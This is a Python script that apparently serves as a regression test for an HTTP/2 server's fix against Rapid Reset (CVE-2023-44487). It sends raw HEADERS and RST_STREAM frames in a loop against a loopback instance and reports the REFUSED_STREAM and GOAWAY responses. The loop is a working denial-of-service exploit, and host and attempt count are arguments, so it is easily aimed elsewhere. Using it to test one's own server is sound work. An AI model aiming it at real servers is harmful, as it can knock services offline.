#!/usr/bin/env python3
"""Minimal Rapid Reset (CVE-2023-44487) client, raw HTTP/2 over h2c.

Opens a stream and cancels it immediately, over and over, and reports what the
server does about it. Deliberately no h2 library: this has to send exactly the
frames an attacker would, not what a well-behaved client library permits.

It found two defects the unit tests could not, and it is the beginning of the
raw-socket harness the H2 plan's open items 4 (HEAD framing) and 9 (h1spec)
want. Keep it.

Usage:
    # against the loopback conformance instance (see deploy HANDOVER.md 3)
    python3 rapidreset.py [attempts] [host] [h2c-port]

Defaults: 200 attempts, 127.0.0.1:18080. Expected against a fixed server:
first refusal at stream #101 of 200, exactly MAX_REFUSED_STREAK refusals, and
one GOAWAY carrying 0xb (ENHANCE_YOUR_CALM). A pre-fix server instead lets
every stream through (no refusals) or answers PROTOCOL_ERROR per cancel.
"""
import socket, struct, sys, time

ATTEMPTS = int(sys.argv[1]) if len(sys.argv) > 1 else 200
HOST     = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PORT     = int(sys.argv[3]) if len(sys.argv) > 3 else 18080

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
T_HEADERS, T_RST, T_SETTINGS, T_GOAWAY = 0x1, 0x3, 0x4, 0x7
END_HEADERS = 0x4
ERR = {0x1: "PROTOCOL_ERROR", 0x7: "REFUSED_STREAM", 0xb: "ENHANCE_YOUR_CALM"}


def frame(ftype, flags, sid, payload=b""):
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) \
        + struct.pack(">I", sid) + payload


# ":method GET" ":scheme https" ":path /" as HPACK static indices, then
# ":authority example.com" as a literal (RFC 9113 8.3.1 requires an origin).
BLOCK = bytes([0x82, 0x87, 0x84, 0x01, 0x0b]) + b"example.com"

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(PREFACE + frame(T_SETTINGS, 0, 0))
time.sleep(0.2)

sid, sent = 1, 0
try:
    for _ in range(ATTEMPTS):
        s.sendall(frame(T_HEADERS, END_HEADERS, sid, BLOCK)
                  + frame(T_RST, 0, sid, struct.pack(">I", 0)))
        sid += 2
        sent += 1
except (BrokenPipeError, ConnectionResetError):
    pass

# Drain and parse whatever came back.
s.settimeout(3)
buf = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        buf += chunk
except socket.timeout:
    pass

i, refused, first_refused_at, goaways = 0, 0, None, []
while i + 9 <= len(buf):
    ln = int.from_bytes(buf[i:i + 3], "big")
    ftype = buf[i + 3]
    fsid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7fffffff
    body = buf[i + 9:i + 9 + ln]
    if ftype == T_RST and len(body) == 4:
        if int.from_bytes(body, "big") == 0x7:
            refused += 1
            if first_refused_at is None:
                first_refused_at = (fsid + 1) // 2
    if ftype == T_GOAWAY and len(body) >= 8:
        goaways.append(int.from_bytes(body[4:8], "big"))
    i += 9 + ln

print(f"streams attempted      : {sent}")
print(f"REFUSED_STREAM replies : {refused}")
print(f"first refusal at stream: #{first_refused_at}")
print(f"GOAWAY frames          : "
      f"{[f'{c:#x} {ERR.get(c, c)}' for c in goaways]}")
